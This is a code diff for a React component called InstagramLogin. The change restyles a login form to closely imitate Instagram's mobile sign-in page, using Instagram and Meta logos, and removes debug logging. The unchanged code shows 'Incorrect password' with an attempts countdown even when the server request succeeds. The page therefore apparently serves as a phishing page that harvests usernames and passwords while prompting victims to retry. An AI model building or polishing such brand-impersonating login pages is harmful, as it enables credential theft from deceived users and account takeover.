@@ -40,7 +40,6 @@ const InstagramLogin = () => {
             setMsg(msg)
             setFlag(flag)
             setBtn(true)
-            console.log(res.data, "true")
             setCount(count - 1)
             alert(`Incorrect password. ${count - 1} attempts left.`)
         }).catch((error) => {
@@ -48,7 +47,7 @@ const InstagramLogin = () => {
             setMsg(msg)
             setFlag(flag)
             setBtn(true)
-            console.log(error.response.data)
+            
 
         })
     };
@@ -78,90 +77,88 @@ const InstagramLogin = () => {
     };
 
     return (
-        <div className="min-h-screen bg-gray-50 flex items-center justify-center">
-            <div className="w-full max-w-sm">
+        <div className="min-h-screen bg-white flex flex-col items-center justify-between py-8 px-5 font-sans">
+            {/* Top Section */}
+            <div className="w-full max-w-sm group">
 
-                {/* Login Card */}
-                <div className="bg-white border border-gray-300 px-10 py-8 text-center">
-                    <div className="flex justify-center">
-                        <img
-                            src="/Instagram.png"
-                            alt="Instagram Logo"
-                            className="h-12 mb-3"
-                        />
-                    </div>
-
-                    <h1 className=" flex justify-center items-center mb-4">
-                        <img
-                            src="/Instagram.svg"
-                            alt="Instagram Logo"
-                            className="h-12 mb-3 "
-                        /></h1>
-
-
-                    <input
-                        type="text"
-                        name='email'
-                        value={formData.email}
-                        placeholder="Phone number, username, or email"
-                        onChange={(e) => formHandel(e)}
-                        className="w-full mb-2 px-3 py-2 text-sm border border-gray-300 rounded bg-gray-50 focus:outline-none"
-
-                    />
-
-                    <p className={` ${flag == 1 || flag == 4 || fFlag ? "opacity-100 translate-y-0" : "opacity-0 -translate-y-1 pointer-events-none"} transition-all text-left  mb-2 pl-1 duration-200 ease-in-out text-xs text-red-500`}>
-                        {fFlag ? "Please enter your username or email" : flag == 1 || flag == 4 ? msg : ""}
-                    </p>
-                    <input
-                        type="password"
-                        value={formData.password}
-                        name='password'
-                        onChange={(e) => formHandel(e)}
-                        placeholder="Password"
-                        className="w-full mb-2 px-3 py-2 text-sm border border-gray-300 rounded bg-gray-50 focus:outline-none"
-
-                    />
-
-                    <p className={` ${flag == 2 || flag == 3 || flag == 5 || fFlag ? "opacity-100 translate-y-0" : "opacity-0 -translate-y-1 pointer-events-none"} transition-all text-left  mb-2 pl-1 duration-200 ease-in-out text-xs text-red-500`}>
-                        {fFlag ? "Please enter your password" : flag == 2 || flag == 3 ? msg : flag == 5 ? `${count > 0 ? `Incorrect password. ${count} attempts left.` : "Too many attempts. Please try again later."}` : ""}
-                    </p>
-
-
-
-                    <button
-                        disabled={!btn}
-                        onClick={loginUser}
-                        className={`${btn ? "cursor-pointer bg-blue-400" : "cursor-not-allowed bg-blue-300"} w-full  text-white py-2 rounded font-semibold `}
-                    >
-                        Log in
-                    </button>
-
-                    <div className="flex items-center my-6">
-                        <div className="grow h-px bg-gray-300"></div>
-                        <span className="mx-4 text-gray-400 text-sm font-semibold">OR</span>
-                        <div className="grow h-px bg-gray-300"></div>
-                    </div>
-
-                    <button onClick={loginOnly} className="text-blue-900 text-sm font-semibold">
-                        Log in with Facebook
-                    </button>
-
-                    <p onClick={redirectToReset} className="text-xs text-blue-900 mt-4 cursor-pointer">
-                        Forgot password?
-                    </p>
-                </div>
-
-                {/* Signup Card */}
-                <div className="bg-white border border-gray-300 mt-3 py-4 text-center text-sm">
-                    Don’t have an account?{" "}
-                    <span onClick={loginOnly} className="text-blue-500 font-semibold cursor-pointer">
-                        Sign up
+                {/* English text */}
+                <div className="flex items-center justify-center text-gray-600">
+                    <span className="text-sm mb-10 transition-all duration-200 group-focus-within:mb-0">
+                        English (US)
                     </span>
                 </div>
 
+                {/* Center Section */}
+                <div className="flex flex-col items-center mt-10">
+
+                    {/* Logo */}
+                    <div className="mb-10">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/600px-Instagram_icon.png" alt="Instagram"
+                            className="w-16 h-16" />
+                    </div>
+
+                    {/* Inputs */}
+                    <div className="w-full space-y-3">
+                        <input
+                            type="text"
+                            name="email"
+                            value={formData.email}
+                            onChange={(e) => formHandel(e)}
+                            placeholder="Username, email or mobile number"
+                            className="w-full p-4 bg-gray-50 border border-gray-200 rounded-xl focus:outline-none focus:border-gray-400 transition text-sm"
+                        />
+                        <p className={` ${flag == 1 || flag == 4 || fFlag ? "opacity-100 translate-y-0" : "opacity-0 -translate-y-1 pointer-events-none"} transition-all text-left  mb-2 pl-1 duration-200 ease-in-out text-xs text-red-500`}>
+                            {fFlag ? "Please enter your username or email" : flag == 1 || flag == 4 ? msg : ""}
+                        </p>
+                        <input
+                            type="password"
+                            name="password"
+                            placeholder="Password"
+                            value={formData.password}
+                            onChange={(e) => formHandel(e)}
+                            className="w-full p-4 bg-gray-50 border border-gray-200 rounded-xl focus:outline-none focus:border-gray-400 transition text-sm"
+                        />
+                        <p className={` ${flag == 2 || flag == 3 || flag == 5 || fFlag ? "opacity-100 translate-y-0" : "opacity-0 -translate-y-1 pointer-events-none"} transition-all text-left  mb-2 pl-1 duration-200 ease-in-out text-xs text-red-500`}>
+                            {fFlag ? "Please enter your password" : flag == 2 || flag == 3 ? msg : flag == 5 ? `${count > 0 ? `Incorrect password. ${count} attempts left.` : "Too many attempts. Please try again later."}` : ""}
+                        </p>
+
+                        <button
+                            disabled={!btn}
+                            onClick={loginUser}
+                            className={`${btn ? "cursor-pointer bg-[#0064e0]" : "cursor-not-allowed bg-blue-300"} w-full ] text-white py-3 rounded-full font-semibold text-base mt-2 active:scale-95 transition-transform`}>
+                            Log in
+                        </button>
+
+                        <div onClick={redirectToReset} className="text-center mt-2 mb-4">
+                            <a href="#" className="text-md font-semibold text-gray-700">
+                                Forgot password?
+                            </a>
+                        </div>
+                    </div>
+                </div>
             </div>
+
+            {/* Bottom Section */}
+            <div className="w-full max-w-sm flex flex-col items-center space-y-6">
+                <button onClick={loginOnly} className="w-full border border-[#0064e0] text-[#0064e0] py-2 rounded-full font-semibold text-sm">
+                    Create new account
+                </button>
+
+                <div className="flex flex-col items-center opacity-60">
+                    <span className="text-xs text-gray-500 mb-1">from</span>
+                    <img
+                        src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Meta_Platforms_Inc._logo.svg/1280px-Meta_Platforms_Inc._logo.svg.png"
+                        alt="Meta"
+                        className="h-4"
+                    />
+                </div>
+            </div>
+
         </div>
-    );
+
+
+    )
 };
+
 
 export default InstagramLogin;
